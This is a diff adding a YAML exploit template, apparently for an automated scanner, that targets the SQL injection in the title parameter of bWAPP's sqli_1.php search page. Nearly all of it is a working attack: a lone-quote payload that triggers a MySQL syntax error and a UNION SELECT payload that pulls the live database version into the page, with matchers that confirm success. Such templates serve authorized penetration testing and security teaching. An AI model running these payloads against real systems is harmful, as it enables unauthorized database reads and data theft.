@@ -1,0 +1,48 @@
+id: bwapp-sqli-get-search
+info:
+  name: SQL Injection (GET/Search) in title parameter — UNION data exfiltration
+  severity: critical
+  description: >
+    The title parameter of sqli_1.php is concatenated into a MySQL query. A
+    single quote raises a SQL syntax error, and a UNION SELECT injects attacker
+    controlled columns into the result set, confirming full read access to the
+    database (here: exfiltrating a marker and the live MySQL version).
+  reference:
+    - https://owasp.org/www-community/attacks/SQL_Injection
+  cwe: CWE-89
+  tags: [sqli, union, injection]
+variables:
+  - name: target
+    required: true
+  - name: cookie
+    required: true
+  - name: errpayload
+    default: "'"
+  - name: unionpayload
+    default: "zz' UNION SELECT 1,concat('AITMSQLi-',version()),3,4,5,6,7-- -"
+steps:
+  # 1. Error-based: a lone quote breaks the query → MySQL syntax error.
+  - http:
+      method: GET
+      url: "{{target}}/sqli_1.php?title={{url_encode(errpayload)}}&action=search"
+      headers:
+        Cookie: "{{cookie}}"
+      matchers:
+        - type: word
+          part: body
+          word: "error in your SQL syntax"
+  # 2. UNION: inject a marker + the live DB version into the result set.
+  - http:
+      method: GET
+      url: "{{target}}/sqli_1.php?title={{url_encode(unionpayload)}}&action=search"
+      headers:
+        Cookie: "{{cookie}}"
+      matchers:
+        - type: word
+          part: body
+          word: "AITMSQLi-"
+success:
+  all:
+    - type: word
+      part: body
+      word: "AITMSQLi-"
